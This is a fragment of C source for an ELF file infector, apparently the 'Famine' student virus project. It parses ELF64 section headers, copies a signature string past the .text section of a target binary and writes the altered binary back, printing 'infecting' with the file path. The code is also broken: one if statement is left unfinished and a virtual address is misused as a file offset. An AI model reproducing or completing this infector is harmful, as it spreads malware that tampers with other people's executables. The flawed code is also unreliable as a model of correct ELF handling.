#include "famine.h"

u_int64_t	section_getter(char *ptr, size_t size, int fd)
{
	Elf64_Ehdr *ehdr = (Elf64_Ehdr*) ptr;

	u_int16_t	shnum			= ehdr->e_shnum;
	Elf64_Off	sht_offset		= ehdr->e_shoff;
	Elf64_Shdr	*shdr = (Elf64_Shdr *) (ptr + sht_offset);
	char *ajustor = ptr + (shdr + ehdr->e_shstrndx)->sh_offset;

	const char	*message = "face a la patate, tout est possible #Famine (jucapik)";

	for (int i = 0 ; i < shnum ; ++i)
	{
		if (!strcmp((char*)(ajustor + shdr[i].sh_name), ".text"))
		{
			size_t sectionaddr = (size_t)shdr[i].sh_addr;
			size_t sectionsize = shdr[i].sh_size;

			memmove(ptr + sectionaddr + sectionsize + 16, message, strlen(message));
		      	write(fd, ptr, size);	
		}
	}
	return (0);
}

int		write_string(char *ptr, size_t size, char *path, int fd)
{
	u_int64_t	sectionoff;
	sectionoff = section_getter(ptr, size, fd);

	if (strstr(ptr,

	printf("infecting %s\n", path);

	return (0);
}
